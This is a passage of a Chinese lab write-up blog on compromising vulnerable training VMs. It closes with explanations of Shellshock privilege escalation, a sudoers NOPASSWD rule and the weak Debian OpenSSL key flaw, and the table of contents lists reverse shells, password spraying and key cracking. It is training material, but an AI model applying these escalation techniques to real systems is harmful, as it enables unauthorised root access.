+<p><strong>Shellshock 的“提权”本质是：</strong> <strong>“谁能启动 root 身份的 Bash 进程，谁就能瞬间拿到 root shell。”</strong> <strong>因此——</strong></p>
+<ul>
+<li><strong>远程</strong>：root 跑的 CGI &#x2F; SSH &#x2F; DHCP → 一条 HTTP 头或 DHCP 选项 &#x3D; root。</li>
+<li><strong>本地</strong>：SUID Bash &#x2F; root cron → 设一个恶意环境变量 &#x3D; root。** **<strong>修完 Bash 补丁 + 把 root 级脚本全换 dash</strong>，这条捷径就彻底堵死。</li>
+</ul>
+<h3 id="NOPASSWD-参数"><a href="#NOPASSWD-参数" class="headerlink" title="NOPASSWD 参数"></a>NOPASSWD 参数</h3><p><strong>sudo 可不可以加上 NOPASSWD 参数，来跳过密码？</strong> <strong>obama ALL&#x3D;(ALL) NOPASSWD: ALL</strong></p>
+<p>**是的，**<strong>可以</strong>通过 <code>NOPASSWD</code> 参数让 sudo 跳过密码验证。</p>
+<p><strong>你给出的这行配置：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obama ALL=(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+
+<p><strong>意思是：</strong></p>
+<ul>
+<li>**用户 **<code>obama</code> 可以在 <strong>所有主机</strong> 上，</li>
+<li>**以 **<strong>任何用户身份</strong>（包括 root），</li>
+<li>**执行 **<strong>任何命令</strong>，</li>
+<li>**并且 **<strong>不需要输入密码</strong>。</li>
+</ul>
+<p>**### **</p>
+<p><strong>一是你利用的是文件读取漏洞,达到的结果却是执行了 cgi(而不是获取文件内容),是为什么：：：有权限，bash 命令</strong></p>
+<p>**### **</p>
+<p>**看了评论区，部分没有搞明白 这个漏洞是生成 rsa 证书时 prng(伪随机数生成器，注意计算机科学中的伪随机数说的是能通过随机统计检验的一组数)的代码改坏了，导致唯一的随机因子只有 pid，当时 linux 的最大 pid 很小，例如这台靶机是 32768，POC 中提到的是 65536，导致生成的证书就那么多种可能，可以被穷举出来 这不说明 RSA 证书不安全，也不说明 2048 位的 RSA 不安全，只说明用该环境下的 ssh-keygen 生成的证书不安全 在这种环境下生成的证书，放到其他没有该漏洞的机器上，一样有问题 P.S. 查看 pid 最大值: cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max 查看 openssl 版本: dpkg -l | grep ssl , 这台机器是 0.9.8e，按照 POC 的说法，**<strong>debian 系 0.9.8c-1 &lt; 0.9.8g-9 的是有该问题的版本</strong></p>
+<p><strong>在讲漏洞原理那块其实可以直接说当你这个版本的 openssl 用了伪随机数获取密钥，所以造成了这个漏洞</strong></p>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2026/03/20/靶机精炼-思路为王（二）/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LampSecurityCTF4-SQL-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%EF%BC%8C%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5%E5%92%8C-SQLmap-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E4%B8%80%E8%B5%B7%E5%91%88%E7%8E%B0%E3%80%82"><span class="toc-number">1.</span> <span class="toc-text">LampSecurityCTF4 - SQL 注入原理，手动注入和 SQLmap 自动化注入一起呈现。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">nmap 扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">TCP 详细信息扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP-%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.4.</span> <span class="toc-text">UDP 扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.5.</span> <span class="toc-text">漏洞脚本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ipv6-%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.6.</span> <span class="toc-text">ipv6 扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">Web 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.文件包含的尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.SQL 注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLmap-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">SQLmap 自动注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-%E5%8F%82%E6%95%B0%E8%A1%A5%E5%86%99"><span class="toc-number">1.4.</span> <span class="toc-text">SSH 参数补写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B-shell"><span class="toc-number">1.5.</span> <span class="toc-text">获得初始 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-%E5%B7%A5%E5%85%B7%E4%B8%8D%E9%87%8D%E8%A6%81%EF%BC%8C%E8%A6%81%E4%BC%9A%E5%85%B7%E4%BD%93%E5%8E%9F%E7%90%86%EF%BC%8C%E5%B7%A5%E5%85%B7%E8%A2%AB-ban-%E4%BA%86%EF%BC%8C%E8%A6%81%E6%9C%89%E6%89%8B%E5%86%99%EF%BC%88ai%EF%BC%89%E7%9A%84%E8%83%BD%E5%8A%9B"><span class="toc-number">1.6.</span> <span class="toc-text">总结    工具不重要，要会具体原理，工具被 ban 了，要有手写（ai）的能力</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LAMPSecurityCTF5-%E6%A0%87%E5%87%86%E6%94%BB%E5%87%BB%E9%93%BE%EF%BC%8C%E5%8D%B4%E5%A4%84%E5%A4%84%E9%9C%80%E8%A6%81%E7%BB%86%E5%BF%83%EF%BC%8C%E6%9E%9A%E4%B8%BE%E5%92%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%83%BD%E5%8A%9B%E6%89%8D%E6%98%AF%E8%80%83%E9%AA%8C%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">LAMPSecurityCTF5 - 标准攻击链，却处处需要细心，枚举和信息收集能力才是考验。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F-1"><span class="toc-number">2.1.</span> <span class="toc-text">nmap 扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E6%B8%97%E9%80%8F-1"><span class="toc-number">2.2.</span> <span class="toc-text">Web 渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NanoCMS-%E6%95%B0%E6%8D%AE%E6%B3%84%E6%BC%8F%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">NanoCMS 数据泄漏的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0-1-%E5%92%8C-3-%E9%83%BD%E6%9C%89-txt-%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.3.1.</span> <span class="toc-text">发现 1 和 3 都有 .txt 的信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5-%E7%A0%B4%E8%A7%A3%E4%B8%80%E4%B8%8B-hashcat"><span class="toc-number">2.3.2.</span> <span class="toc-text">MD5 破解一下  hashcat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%A5%BD%E5%AD%97%E5%85%B8"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">准备好字典</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-CMS-%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E5%8F%8D%E5%BC%B9-shell%EF%BC%88%E4%B9%9F%E5%8F%AF%E4%BB%A5-RCE-%E4%BA%86%EF%BC%89"><span class="toc-number">2.4.</span> <span class="toc-text">利用 CMS 漏洞获取反弹 shell（也可以 RCE 了）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">2.5.</span> <span class="toc-text">敏感文件提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E5%A6%86%E7%85%A7"><span class="toc-number">2.5.1.</span> <span class="toc-text">定妆照</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.6.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LAMPSecurityCTF7-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%AD%94%E6%B3%95%E3%80%81%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84%EF%BC%8C%E8%BF%99%E6%89%8D%E6%98%AF%E5%AE%9E%E6%88%98%E6%8A%80%E6%9C%AF%E3%80%82"><span class="toc-number">3.</span> <span class="toc-text">LAMPSecurityCTF7 - 字符串魔法、密码喷射，这才是实战技术。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F-2"><span class="toc-number">3.1.</span> <span class="toc-text">nmap 扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.1.1.</span> <span class="toc-text">主机探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1"><span class="toc-number">3.1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP-%E6%89%AB%E6%8F%8F-1"><span class="toc-number">3.1.3.</span> <span class="toc-text">UDP 扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.4.</span> <span class="toc-text">详细信息扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F-1"><span class="toc-number">3.1.5.</span> <span class="toc-text">漏洞脚本扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E6%B8%97%E9%80%8F-2"><span class="toc-number">3.2.</span> <span class="toc-text">Web 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#80"><span class="toc-number">3.2.1.</span> <span class="toc-text">80</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8080-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.2.</span> <span class="toc-text">8080:SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">3.2.3.</span> <span class="toc-text">目录爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B-shell-1"><span class="toc-number">3.3.</span> <span class="toc-text">获得初始 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-%E5%96%B7%E5%B0%84"><span class="toc-number">3.4.</span> <span class="toc-text">密码破解 喷射</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crackmapexec-%E7%A2%B0%E6%92%9E%E5%A4%A7%E9%87%8F%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">3.4.1.</span> <span class="toc-text">crackmapexec 碰撞大量用户名和密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F"><span class="toc-number">3.5.1.</span> <span class="toc-text">提权成功</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">3.6.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pWnOS2-0-%E7%AE%80%E6%B4%81%E6%98%8E%E5%BF%AB%E7%9A%84%E6%94%BB%E5%87%BB%E9%93%BE%EF%BC%8Cphp-mysql-%E6%9E%B6%E6%9E%84-cms-%E6%B8%97%E9%80%8F%E7%9A%84%E6%A0%B7%E6%9C%AC%E3%80%82"><span class="toc-number">4.</span> <span class="toc-text">pWnOS2.0 - 简洁明快的攻击链，php+mysql 架构 cms 渗透的样本。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F-3"><span class="toc-number">4.1.</span> <span class="toc-text">nmap 扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E6%B8%97%E9%80%8F-3"><span class="toc-number">4.2.</span> <span class="toc-text">Web 渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CMS-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.3.</span> <span class="toc-text">CMS 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">4.4.</span> <span class="toc-text">文件上传的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B-shell-2"><span class="toc-number">4.5.</span> <span class="toc-text">获得初始 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-%E6%95%B0%E6%8D%AE%E8%8E%B7%E5%8F%96"><span class="toc-number">4.6.</span> <span class="toc-text">MySQL 数据获取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-number">4.6.1.</span> <span class="toc-text">破解密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E7%99%BB%E5%BD%95%E7%9A%84%E5%B0%9D%E8%AF%95%E2%80%93%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8-x"><span class="toc-number">4.7.</span> <span class="toc-text">ssh 登录的尝试–密码复用 x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#root-%E6%9D%83%E9%99%90"><span class="toc-number">4.8.</span> <span class="toc-text">root 权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">4.9.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%BC%80%E6%BA%90%E4%BC%A0%E7%BB%9F-CMS%EF%BC%88PHP-NET-Java-%E7%B3%BB%EF%BC%89"><span class="toc-number">4.9.1.</span> <span class="toc-text">一、开源传统 CMS（PHP &#x2F; .NET &#x2F; Java 系）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SaaS-%E4%BA%91%E5%BB%BA%E7%AB%99-CMS%EF%BC%88%E9%9B%B6%E4%BB%A3%E7%A0%81-%E7%94%B5%E5%95%86-%E6%8B%96%E6%8B%BD%EF%BC%89"><span class="toc-number">4.9.2.</span> <span class="toc-text">二、SaaS 云建站 CMS（零代码 &#x2F; 电商 &#x2F; 拖拽）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%96%B0%E4%B8%80%E4%BB%A3%E3%80%8C%E6%97%A0%E5%A4%B4-CMS%E3%80%8D-%E7%9F%A5%E8%AF%86%E4%BD%93%E9%AA%8C%E4%BA%91%EF%BC%88API-%E4%BC%98%E5%85%88%EF%BC%8C%E5%86%85%E5%AE%B9-AI%EF%BC%89"><span class="toc-number">4.9.3.</span> <span class="toc-text">三、新一代「无头 CMS」&amp; 知识体验云（API 优先，内容 +AI）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pWnOS1-0-%E5%9C%A8-Perl-CGI-%E6%9E%B6%E6%9E%84%E4%B8%8B%E6%9E%84%E9%80%A0%E5%8F%8D%E5%BC%B9-shell-%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-number">5.</span> <span class="toc-text">pWnOS1.0 - 在 Perl CGI 架构下构造反弹 shell-解法一</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webmin"><span class="toc-number">5.1.</span> <span class="toc-text">渗透测试 webmin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F-4"><span class="toc-number">5.2.</span> <span class="toc-text">nmap 扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E6%B8%97%E9%80%8F-4"><span class="toc-number">5.3.</span> <span class="toc-text">Web 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89-80-%E7%AB%AF%E5%8F%A3"><span class="toc-number">5.3.1.</span> <span class="toc-text">有 80 端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10000-%E7%AB%AF%E5%8F%A3"><span class="toc-number">5.3.2.</span> <span class="toc-text">10000 端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#john-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">5.4.</span> <span class="toc-text">john 密码破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B-shell-3"><span class="toc-number">5.5.</span> <span class="toc-text">获得初始 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83"><span class="toc-number">5.6.</span> <span class="toc-text">利用权限配置不当提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#root"><span class="toc-number">5.7.</span> <span class="toc-text">root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">5.8.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%AE%89%E8%A3%85%E7%9A%84%E9%9D%B6%E6%9C%BA%E6%89%AB%E4%B8%8D%E5%88%B0%EF%BC%9A"><span class="toc-number">5.8.1.</span> <span class="toc-text">关于安装的靶机扫不到：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#perl-%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6%E5%92%8C-cgi-%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6%E5%88%86%E5%88%AB%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8"><span class="toc-number">5.9.</span> <span class="toc-text">perl 格式文件和 cgi 格式文件分别有什么用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pWnOS1-0-%E9%80%89%E6%8B%A9-hard-%E6%A8%A1%E5%BC%8F%E5%86%8D%E6%AC%A1%E7%94%A8%E5%AE%8C%E5%85%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E8%BF%99%E5%8F%B0%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%82-%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-number">7.</span> <span class="toc-text">pWnOS1.0 - 选择 hard 模式再次用完全不同的方法实现这台靶机的渗透测试。-解法二</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B"><span class="toc-number">7.1.</span> <span class="toc-text">开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95-authorized-keys-%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96"><span class="toc-number">7.2.</span> <span class="toc-text">免密登录 authorized_keys 文件获取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">7.2.1.</span> <span class="toc-text">&#x2F;&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F-%E5%8C%85%E5%90%AB%E5%8F%91%E7%8E%B0%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%8F%E9%AA%8C%EF%BC%88%E7%B2%BE%EF%BC%89"><span class="toc-number">7.3.</span> <span class="toc-text">文件泄漏&#x2F;包含发现敏感文件的经验（精）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E5%85%AC%E9%92%A5%E4%BF%A1%E6%81%AF%E7%A0%B4%E8%A7%A3%E5%87%BA%E7%A7%81%E9%92%A5%EF%BC%88%E7%B2%BE%EF%BC%89"><span class="toc-number">7.4.</span> <span class="toc-text">用公钥信息破解出私钥（精）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%85%AC%E7%A7%81%E9%92%A5%E5%AF%B9%E5%BA%93"><span class="toc-number">7.4.1.</span> <span class="toc-text">下载公私钥对库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%8E%8B%E7%BC%A9"><span class="toc-number">7.4.2.</span> <span class="toc-text">解压缩</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-authorized-keys-%E7%9A%84%E5%85%AC%E9%92%A5%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2"><span class="toc-number">7.4.3.</span> <span class="toc-text">用 authorized_keys 的公钥进行搜索</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%84%E7%90%86-ssh-%E7%99%BB%E5%BD%95%E5%8F%82%E6%95%B0%E9%97%AE%E9%A2%98%EF%BC%88%E7%B2%BE%EF%BC%89"><span class="toc-number">7.5.</span> <span class="toc-text">处理 ssh 登录参数问题（精）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E9%94%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">7.5.1.</span> <span class="toc-text">主键类型的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pubkey-%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">7.5.2.</span> <span class="toc-text">pubkey 的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%8F%AF%E8%83%BD%E9%81%87%E8%A7%81%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">7.5.3.</span> <span class="toc-text">其他可能遇见的问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B%E6%9D%83%E9%99%90-shell"><span class="toc-number">7.6.</span> <span class="toc-text">获得初始权限 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%8C%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%8F%8A%E7%BB%8F%E9%AA%8C%EF%BC%88%E7%B2%BE%EF%BC%89"><span class="toc-number">7.7.</span> <span class="toc-text">方法一，内核提权及经验（精）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%8Cshellshock-%E6%8F%90%E6%9D%83%EF%BC%88%E7%B2%BE-%EF%BC%89"><span class="toc-number">7.8.</span> <span class="toc-text">方法二，shellshock 提权（精 ）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8%EF%BC%9F"><span class="toc-number">7.8.1.</span> <span class="toc-text">存在？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="toc-number">7.8.2.</span> <span class="toc-text">利用？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-number">7.9.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%87%8C%E2%80%9C%E6%8B%BF%E7%9D%80%E5%85%AC%E9%92%A5%E8%BF%98%E8%83%BD%E6%89%93%E2%80%9D%E7%9A%84-6-%E6%9D%A1%E7%8E%B0%E5%AE%9E%E8%B7%AF%E5%BE%84"><span class="toc-number">7.9.1.</span> <span class="toc-text">渗透测试里“拿着公钥还能打”的 6 条现实路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%9A%84%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="toc-number">7.9.2.</span> <span class="toc-text">linux 目前最新的内核版本是多少</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E7%9A%84-suid"><span class="toc-number">7.9.3.</span> <span class="toc-text">linux 的 suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellshock-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B%EF%BC%88%E6%81%B6%E6%84%8F%E5%9C%BA%E6%99%AF%EF%BC%89"><span class="toc-number">7.9.4.</span> <span class="toc-text">shellshock 漏洞触发流程（恶意场景）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NOPASSWD-%E5%8F%82%E6%95%B0"><span class="toc-number">7.9.5.</span> <span class="toc-text">NOPASSWD 参数</span></a></li></ol></li></ol></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2026/03/20/靶机精炼-思路为王（三）/">靶机精炼-思路为王（三）</a>
+            </p>
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2026/03/20/靶机精炼-思路为王（一）/">靶机精炼-思路为王（一）</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧\\x7e","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
